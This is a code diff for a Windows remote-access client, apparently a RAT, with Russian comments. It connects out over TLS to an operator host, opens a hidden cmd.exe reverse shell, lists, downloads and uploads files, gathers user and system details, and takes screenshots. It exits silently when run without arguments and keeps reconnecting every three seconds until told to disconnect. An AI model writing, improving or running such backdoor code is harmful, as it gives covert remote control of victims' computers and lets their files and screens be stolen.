@@ -1,224 +1,257 @@
 #include "../common/proto.h"
 #include "../common/tls.h"
-#include <string>
-#include <cstdio>
+#include <windows.h>
+#include <stdio.h>
 
-static TlsCtx* g_tls = nullptr;
+static TlsCtx* g_tls = NULL;
 static volatile LONG g_run = 1;
-static HANDLE g_hShellInW = nullptr, g_hShellOutR = nullptr, g_hShellProc = nullptr;
+static volatile LONG g_bye = 0;   // set only when the operator sends C_BYE
+static HANDLE g_hShellInW = NULL, g_hShellOutR = NULL, g_hShellProc = NULL;
 static CRITICAL_SECTION g_cs;
 
 static DWORD WINAPI ShellReader(LPVOID) {
   char buf[4096]; DWORD n;
   HANDLE out = g_hShellOutR;
-  while (ReadFile(out, buf, sizeof(buf), &n, nullptr)) {
+  while (ReadFile(out, buf, sizeof(buf), &n, NULL)) {
     if (n == 0) break;
     EnterCriticalSection(&g_cs);
-    if (g_tls && g_run) TlsSendMsg(*g_tls, C_SHELL_DATA, buf, (uint32_t)n);
+    if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_DATA, buf, n);
     LeaveCriticalSection(&g_cs);
   }
   EnterCriticalSection(&g_cs);
-  if (g_tls && g_run) TlsSendMsg(*g_tls, C_SHELL_CLOSE, "", 0);
+  if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_CLOSE, NULL, 0);
   LeaveCriticalSection(&g_cs);
   return 0;
 }
 
 static void ShellStart() {
-  SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
+  SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
   HANDLE inR, inW, outR, outW;
   if (!CreatePipe(&inR, &inW, &sa, 0) || !CreatePipe(&outR, &outW, &sa, 0)) return;
   SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
   SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
-  STARTUPINFOA si{}; si.cb = sizeof(si);
+  STARTUPINFOA si = { 0 }; si.cb = sizeof(si);
   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.hStdInput = inR; si.hStdOutput = outW; si.hStdError = outW;
-  PROCESS_INFORMATION pi{};
-  // Запускаем cmd и сразу ставим UTF-8
-  if (!CreateProcessA(nullptr, (LPSTR)"cmd.exe /Q /K chcp 65001 > nul", nullptr, nullptr, TRUE,
-                      CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+  PROCESS_INFORMATION pi = { 0 };
+  if (!CreateProcessA(NULL, (LPSTR)"cmd.exe /Q /K chcp 65001 > nul", NULL, NULL, TRUE,
+                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
     CloseHandle(inR); CloseHandle(inW); CloseHandle(outR); CloseHandle(outW);
     return;
   }
   g_hShellInW = inW; g_hShellOutR = outR; g_hShellProc = pi.hProcess;
   CloseHandle(inR); CloseHandle(outW); CloseHandle(pi.hThread);
-  CreateThread(nullptr, 0, ShellReader, nullptr, 0, nullptr);
+  CreateThread(NULL, 0, ShellReader, NULL, 0, NULL);
 }
 
 static void ShellStop() {
-  if (g_hShellProc) { TerminateProcess(g_hShellProc, 0); CloseHandle(g_hShellProc); g_hShellProc = nullptr; }
-  if (g_hShellInW) { CloseHandle(g_hShellInW); g_hShellInW = nullptr; }
-  if (g_hShellOutR) { CloseHandle(g_hShellOutR); g_hShellOutR = nullptr; }
+  if (g_hShellProc) { TerminateProcess(g_hShellProc, 0); CloseHandle(g_hShellProc); g_hShellProc = NULL; }
+  if (g_hShellInW) { CloseHandle(g_hShellInW); g_hShellInW = NULL; }
+  if (g_hShellOutR) { CloseHandle(g_hShellOutR); g_hShellOutR = NULL; }
 }
 
-static std::string FsList(const std::string& path) {
-  std::string glob = path;
-  if (glob.empty()) glob = "C:\\";
-  if (glob.back() != '\\' && glob.back() != '/') glob += "\\*";
-  else glob += "*";
-  WIN32_FIND_DATAA fd; std::string out;
-  HANDLE h = FindFirstFileA(glob.c_str(), &fd);
-  if (h == INVALID_HANDLE_VALUE) return "ERR|" + std::to_string(GetLastError()) + "\n";
+static char* FsList(const char* path, uint32_t* outLen) {
+  char glob[MAX_PATH * 2];
+  if (!path || path[0] == 0) strcpy(glob, "C:\\*");
+  else {
+    strcpy(glob, path);
+    size_t len = strlen(glob);
+    if (glob[len-1] != '\\' && glob[len-1] != '/') strcat(glob, "\\*");
+    else strcat(glob, "*");
+  }
+
+  WIN32_FIND_DATAA fd;
+  HANDLE h = FindFirstFileA(glob, &fd);
+  if (h == INVALID_HANDLE_VALUE) {
+    char* err = (char*)malloc(32);
+    if (!err) { *outLen = 0; return NULL; }
+    sprintf(err, "ERR|%lu\n", GetLastError());
+    *outLen = strlen(err); return err;
+  }
+
+  char* out = NULL; size_t outSize = 0, outCap = 0;
   do {
     uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
-    out += fd.cFileName; out += '|'; out += std::to_string(sz); out += '|';
-    out += (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d\n" : "f\n";
+    char line[512];
+    sprintf(line, "%s|%llu|%s\n", fd.cFileName, sz, (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d" : "f");
+    size_t lineLen = strlen(line);
+    if (outSize + lineLen + 1 > outCap) {
+      outCap = (outCap + lineLen + 1) * 2;
+      char* newOut = (char*)realloc(out, outCap);
+      if (!newOut) { free(out); FindClose(h); *outLen = 0; return NULL; }
+      out = newOut;
+    }
+    memcpy(out + outSize, line, lineLen); outSize += lineLen;
   } while (FindNextFileA(h, &fd));
   FindClose(h);
+
+  if (!out) out = (char*)malloc(1);
+  if (out) out[outSize] = 0;
+  *outLen = (uint32_t)outSize;
   return out;
 }
 
-static std::string SysInfo() {
-  char host[256] = {}, user[256] = {}, dir[MAX_PATH] = {};
+static char* SysInfo(uint32_t* outLen) {
+  char host[256] = {0}, user[256] = {0}, dir[MAX_PATH] = {0};
   DWORD n = sizeof(host); GetComputerNameA(host, &n);
   n = sizeof(user); GetUserNameA(user, &n);
   GetCurrentDirectoryA(sizeof(dir), dir);
-  MEMORYSTATUSEX ms{ sizeof(ms) }; GlobalMemoryStatusEx(&ms);
-  char windir[MAX_PATH] = {}; GetWindowsDirectoryA(windir, sizeof(windir));
-  std::string s;
-  s += "host:    "; s += host; s += "\nuser:    "; s += user;
-  s += "\nwindir:  "; s += windir; s += "\ncwd:     "; s += dir;
-  s += "\nram:     "; s += std::to_string(ms.ullTotalPhys / (1024 * 1024)); s += " MB total, ";
-  s += std::to_string(ms.ullAvailPhys / (1024 * 1024)); s += " MB free";
-  ULARGE_INTEGER fr, tot, freeBytes;
+  MEMORYSTATUSEX ms = { sizeof(ms) }; GlobalMemoryStatusEx(&ms);
+  char windir[MAX_PATH] = {0}; GetWindowsDirectoryA(windir, sizeof(windir));
+  ULARGE_INTEGER fr = {0}, tot = {0}, freeBytes = {0};
   GetDiskFreeSpaceExA("C:\\", &fr, &tot, &freeBytes);
-  s += "\ndisk C: "; s += std::to_string(tot.QuadPart / (1024 * 1024 * 1024)); s += " GB total, ";
-  s += std::to_string(fr.QuadPart / (1024 * 1024 * 1024)); s += " GB free";
-  s += "\npid:     "; s += std::to_string(GetCurrentProcessId()); s += "\n";
+
+  char* s = (char*)malloc(1024);
+  if (!s) { *outLen = 0; return NULL; }
+  sprintf(s, "host: %s\nuser: %s\nwindir: %s\ncwd: %s\nram: %llu MB total, %llu MB free\ndisk C: %llu GB total, %llu GB free\npid: %lu\n",
+    host, user, windir, dir, ms.ullTotalPhys / (1024*1024), ms.ullAvailPhys / (1024*1024),
+    tot.QuadPart / (1024*1024*1024), fr.QuadPart / (1024*1024*1024), GetCurrentProcessId());
+  *outLen = strlen(s);
   return s;
 }
 
-static std::string Screenshot() {
+static char* Screenshot(uint32_t* outLen) {
   int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN), vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
   int vx = GetSystemMetrics(SM_XVIRTUALSCREEN), vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
-  HDC scr = GetDC(nullptr), mem = CreateCompatibleDC(scr);
+  HDC scr = GetDC(NULL), mem = CreateCompatibleDC(scr);
   HBITMAP bm = CreateCompatibleBitmap(scr, vw, vh);
   SelectObject(mem, bm);
   BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT);
-  BITMAPINFO bi{}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+
+  BITMAPINFO bi = {0}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
   bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
   bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
   int rowBytes = ((vw * 3 + 3) & ~3);
   DWORD px = (DWORD)rowBytes * vh;
-  std::string pixels(px, 0);
-  GetDIBits(mem, bm, 0, vh, (void*)pixels.data(), &bi, DIB_RGB_COLORS);
-  BITMAPFILEHEADER fh{};
+
+  BITMAPFILEHEADER fh = {0};
   fh.bfType = 'B' | ('M' << 8);
   fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER);
   fh.bfSize = fh.bfOffBits + px;
-  std::string out;
-  out.append((char*)&fh, sizeof(fh));
-  out.append((char*)&bi.bmiHeader, sizeof(BITMAPINFOHEADER));
-  out += pixels;
-  DeleteObject(bm); DeleteDC(mem); ReleaseDC(nullptr, scr);
+
+  char* out = (char*)malloc(fh.bfSize);
+  if (out) {
+    memcpy(out, &fh, sizeof(fh));
+    memcpy(out + sizeof(fh), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
+    GetDIBits(mem, bm, 0, vh, out + fh.bfOffBits, &bi, DIB_RGB_COLORS);
+    *outLen = fh.bfSize;
+  } else *outLen = 0;
+
+  DeleteObject(bm); DeleteDC(mem); ReleaseDC(NULL, scr);
   return out;
 }
 
-static std::string ReadFileAll(const std::string& p, bool& ok) {
-  HANDLE f = CreateFileA(p.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
-  std::string s;
-  if (f == INVALID_HANDLE_VALUE) { ok = false; return s; }
-  char buf[65536]; DWORD n;
-  while (ReadFile(f, buf, sizeof(buf), &n, nullptr) && n) s.append(buf, n);
-  CloseHandle(f); ok = true; return s;
+static char* ReadFileAll(const char* p, uint32_t* outLen) {
+  HANDLE f = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+  if (f == INVALID_HANDLE_VALUE) { *outLen = 0; return NULL; }
+  DWORD sz = GetFileSize(f, NULL);
+  char* buf = (char*)malloc(sz);
+  DWORD n = 0;
+  if (buf) ReadFile(f, buf, sz, &n, NULL);
+  CloseHandle(f);
+  *outLen = buf ? n : 0;
+  return buf;
 }
 
-static bool WriteFileAll(const std::string& p, const std::string& d) {
-  HANDLE f = CreateFileA(p.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
-  if (f == INVALID_HANDLE_VALUE) return false;
-  DWORD n; BOOL ok = TRUE; size_t off = 0;
-  while (ok && off < d.size()) {
-    uint32_t chunk = (uint32_t)(d.size() - off < (1u << 20) ? d.size() - off : (1u << 20));
-    ok = WriteFile(f, d.data() + off, chunk, &n, nullptr);
-    off += chunk;
-  }
-  CloseHandle(f); return ok != FALSE;
+static void WriteFileAll(const char* p, const char* d, uint32_t dLen) {
+  HANDLE f = CreateFileA(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+  if (f == INVALID_HANDLE_VALUE) return;
+  DWORD n;
+  WriteFile(f, d, dLen, &n, NULL);
+  CloseHandle(f);
 }
 
 static DWORD WINAPI Worker(LPVOID param) {
   const char* addr = (const char*)param;
-  char host[512]; int port = 8443;
-  char* colon = strchr((char*)addr, ':');
+  char host[256] = {0}; int port = 8443;
+  strncpy(host, addr, 255);
+  char* colon = strchr(host, ':');
   if (colon) { *colon = 0; port = atoi(colon + 1); }
-  strcpy(host, addr);
 
-  struct addrinfo* ai = nullptr;
-  getaddrinfo(host, std::to_string(port).c_str(), nullptr, &ai);
+  struct addrinfo* ai = NULL;
+  char portStr[16]; sprintf(portStr, "%d", port);
+  if (getaddrinfo(host, portStr, NULL, &ai) != 0) return 0;
+
   SOCKET s = INVALID_SOCKET;
   for (auto p = ai; p; p = p->ai_next) {
     s = socket(p->ai_family, SOCK_STREAM, 0);
+    if (s == INVALID_SOCKET) continue;
     if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
     closesocket(s); s = INVALID_SOCKET;
   }
   freeaddrinfo(ai);
   if (s == INVALID_SOCKET) return 0;
 
-  TlsCtx* t = new TlsCtx(); t->sock = s;
-  if (!TlsAcquire(*t, nullptr) || !TlsHandshake(*t)) {
-    delete t; closesocket(s); return 0;
-  }
+  TlsCtx* t = (TlsCtx*)malloc(sizeof(TlsCtx));
+  if (!t) return 0;
+  InitTlsCtx(t, s);
+  if (!TlsAcquire(t, NULL) || !TlsHandshake(t)) { free(t); closesocket(s); return 0; }
   EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);
 
-  char hbuf[256] = {}, ubuf[256] = {}; DWORD n = sizeof(hbuf);
+  char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
   GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
-  std::string hello = std::string(hbuf) + "|" + ubuf + "|Windows";
-  TlsSendMsg(*t, C_HELLO, hello.data(), (uint32_t)hello.size());
+  char hello[1024]; sprintf(hello, "%s|%s|Windows", hbuf, ubuf);
+  TlsSendMsg(t, C_HELLO, hello, strlen(hello));
 
-  uint16_t cmd; std::string pl;
+  uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
   for (;;) {
-    if (!TlsRecvMsg(*t, cmd, pl)) break;
+    if (!TlsRecvMsg(t, &cmd, &pl, &plLen)) break;
     switch (cmd) {
       case C_SHELL_START: ShellStart(); break;
       case C_SHELL_CLOSE: ShellStop(); break;
       case C_SHELL_DATA:
-        if (g_hShellInW) { DWORD w; WriteFile(g_hShellInW, pl.data(), (DWORD)pl.size(), &w, nullptr); }
+        if (g_hShellInW && pl) { DWORD w; WriteFile(g_hShellInW, pl, plLen, &w, NULL); }
         break;
       case C_FS_LIST: {
-        std::string r = FsList(pl);
-        TlsSendMsg(*t, C_FS_LIST_RESP, r.data(), (uint32_t)r.size()); break;
+        uint32_t outLen; char* r = FsList(pl, &outLen);
+        if (r) { TlsSendMsg(t, C_FS_LIST_RESP, r, outLen); free(r); }
+        break;
       }
       case C_FS_GET: {
-        bool ok; std::string d = ReadFileAll(pl, ok);
-        TlsSendMsg(*t, C_FS_FILE, ok ? d.data() : "", ok ? (uint32_t)d.size() : 0); break;
+        uint32_t outLen; char* d = ReadFileAll(pl, &outLen);
+        if (d) { TlsSendMsg(t, C_FS_FILE, d, outLen); free(d); }
+        else TlsSendMsg(t, C_FS_FILE, NULL, 0);
+        break;
       }
       case C_FS_PUT: {
-        size_t nl = pl.find('\n');
-        if (nl != std::string::npos) WriteFileAll(pl.substr(0, nl), pl.substr(nl + 1));
+        char* nl = strchr(pl, '\n');
+        if (nl) { *nl = 0; WriteFileAll(pl, nl + 1, plLen - (uint32_t)(nl - pl) - 1); }
         break;
       }
       case C_SYSINFO: {
-        std::string r = SysInfo();
-        TlsSendMsg(*t, C_SYSINFO, r.data(), (uint32_t)r.size()); break;
+        uint32_t outLen; char* r = SysInfo(&outLen);
+        if (r) { TlsSendMsg(t, C_SYSINFO, r, outLen); free(r); }
+        break;
       }
       case C_SCREEN: {
-        std::string bmp = Screenshot();
-        TlsSendMsg(*t, C_SCREEN_IMG, bmp.data(), (uint32_t)bmp.size()); break;
+        uint32_t outLen; char* bmp = Screenshot(&outLen);
+        if (bmp) { TlsSendMsg(t, C_SCREEN_IMG, bmp, outLen); free(bmp); }
+        break;
       }
-      case C_BYE: goto done;
+      case C_BYE: g_bye = 1; goto done;
     }
+
+    // ВОТ ГЛАВНЫЙ ФИКС: Освобождаем pl ТОЛЬКО после того, как все данные из него скопированы и отправлены!
+    if (pl) { free(pl); pl = NULL; }
   }
 done:
   ShellStop();
-  EnterCriticalSection(&g_cs); g_tls = nullptr; LeaveCriticalSection(&g_cs);
-  TlsSendMsg(*t, C_BYE, "", 0);
-  closesocket(s); delete t;
+  EnterCriticalSection(&g_cs); g_tls = NULL; LeaveCriticalSection(&g_cs);
+  TlsSendMsg(t, C_BYE, NULL, 0);
+  closesocket(s); FreeTlsCtx(t); free(t);
   return 0;
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
   InitializeCriticalSection(&g_cs);
   WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
-
-  if (!lpCmdLine || !*lpCmdLine) {
-    return 0; // Тихо выходим, если нет аргументов
-  }
-
-  CreateThread(nullptr, 0, Worker, lpCmdLine, 0, nullptr);
-
-  // Держим процесс живым
-  MSG msg;
-  while (GetMessageA(&msg, nullptr, 0, 0)) {
-    TranslateMessage(&msg); DispatchMessageA(&msg);
+  if (!lpCmdLine || !*lpCmdLine) return 0;
+  // Panel may be closed, crashed or restarted; a remote agent must survive that
+  // and keep trying. Only an explicit "Disconnect client" (C_BYE) ends it.
+  while (!g_bye) {
+    Worker(lpCmdLine);
+    if (!g_bye) Sleep(3000);
   }
   return 0;
 }
